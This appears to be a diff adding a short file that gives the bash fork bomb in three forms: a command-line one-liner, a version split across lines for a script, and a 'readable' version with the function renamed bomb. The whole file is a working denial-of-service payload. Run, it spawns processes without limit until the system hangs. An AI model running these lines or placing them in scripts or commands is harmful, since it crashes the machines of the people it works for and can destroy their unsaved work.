@@ -1,0 +1,16 @@
+#Commandline
+:(){ :|:& };:
+
+
+#Split for bash script
+
+:(){
+ :|:&
+};:
+
+# Human redable / more understable
+
+bomb() { 
+ bomb | bomb &
+}; bomb
+
